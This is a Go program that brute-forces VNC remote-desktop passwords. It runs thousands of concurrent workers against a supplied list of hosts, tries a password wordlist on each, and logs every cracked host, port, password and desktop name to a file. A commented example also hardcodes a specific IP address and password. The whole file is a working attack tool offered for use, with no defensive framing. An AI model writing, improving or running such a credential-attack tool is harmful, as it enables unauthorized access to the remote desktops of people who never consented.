package main

import (
  "fmt"
  "context"
  "net"
  "sync"
  "os"
  "time"
  "bufio"
  "github.com/kward/go-vnc"
)

/* LOGIN ATTEMPT EXAMPLE
  nc, err := net.Dial("tcp", "93.240.34.135:5900")
  if err != nil {
    log.Fatalf("Error connecting to VNC host. %v", err)
  }

  vcc := vnc.NewClientConfig("servicewasdwasd")
  _, err = vnc.Connect(context.Background(), nc, vcc)
  if err != nil {
    log.Fatalf("Error negotiating connection to VNC host. %v", err)
  }

  log.Printf("Cool i think we got auth..\r\n")
*/

var running_threads int = 0
var passwords[] string
var file_mutex sync.Mutex
var thread_count_mutex sync.Mutex
var waitGroup sync.WaitGroup


func print_file(host string, port string, password string, computername string) {
  file_mutex.Lock()
  defer file_mutex.Unlock()
  f, err := os.OpenFile("bruteforced.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
  if err != nil {
    return
  }
  if _, err := f.Write([]byte(fmt.Sprintf("%s:%s:%s:%s\r\n", host, port, password, computername))); err != nil {
    if err := f.Close(); err != nil {
      return
    }
    return
  }
  if err := f.Close(); err != nil {
      return
  }
}

func try_auth(host string, port string, password string) (bool, string) {
  nc, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
  if err != nil {
    return false, ""
  }

  vcc := vnc.NewClientConfig(password)
  cli, err := vnc.Connect(context.Background(), nc, vcc)
  if err != nil {
    return false, ""
  }
  
  pc_name := cli.DesktopName()
  
  cli.Close()
  return true, pc_name
}

func worker_routine(host string, port string) {
  thread_count_mutex.Lock()
  running_threads++
  thread_count_mutex.Unlock()

  for i := 0; i < len(passwords); i++ {
    succeeded, computer_name := try_auth(host,port,passwords[i])
    if succeeded == true {
      fmt.Printf("[Worker] Successfully bruteforced VNC target! (%s:%s:%s) (%s)\r\n", host, port, passwords[i], computer_name)
      print_file(host, port, passwords[i], computer_name)
      break
    }
    time.Sleep(4*time.Second)
  }

  thread_count_mutex.Lock()
  running_threads--
  thread_count_mutex.Unlock()
}

func main() {
  if len(os.Args) < 3 {
    fmt.Printf("%s <credential-file> <ip:port list>\r\n", os.Args[0])
    return
  }
  
  //parse passwords
  cred_file, err := os.Open(os.Args[1])
  if err != nil {
    fmt.Printf("Failed to open credential file! (%s)\r\n", os.Args[1])
  }
  cred_scanner := bufio.NewScanner(cred_file)
  for cred_scanner.Scan() {
    passwords = append(passwords, cred_scanner.Text())
  }
  cred_file.Close()

  //parse hosts and start threads
  host_file, err := os.Open(os.Args[2])
  if err != nil {
    fmt.Printf("Failed to open credential file! (%s)\r\n", os.Args[1])
  }
  host_scanner := bufio.NewScanner(host_file)
  
  for host_scanner.Scan() {
    thread_count_mutex.Lock()
    tmp_thread_count := running_threads
    thread_count_mutex.Unlock()
    for tmp_thread_count > 4500 {
      time.Sleep(500*time.Millisecond)
      thread_count_mutex.Lock()
      tmp_thread_count = running_threads
      thread_count_mutex.Unlock()
    }
    host, port, err := net.SplitHostPort(host_scanner.Text())
    if err != nil {
      fmt.Printf("There was error parsing host:port in host_file! (%s:%s)\r\n", os.Args[2], host_scanner.Text())
      continue
    } else {
      go worker_routine(host, port)
    }
  }
  
  host_file.Close()
  
  time.Sleep(40*time.Second)
}
